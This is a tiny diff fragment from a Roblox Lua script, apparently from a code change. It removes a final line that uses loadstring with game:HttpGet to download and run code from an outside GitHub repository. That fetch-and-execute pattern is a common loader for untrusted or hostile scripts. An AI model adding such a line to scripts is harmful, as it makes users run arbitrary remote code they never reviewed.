@@ -43,5 +43,3 @@ RunService.Heartbeat:Connect(function()
        end
    end
 end)
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/OscarPolska/doorsch/main/nikaney"))()
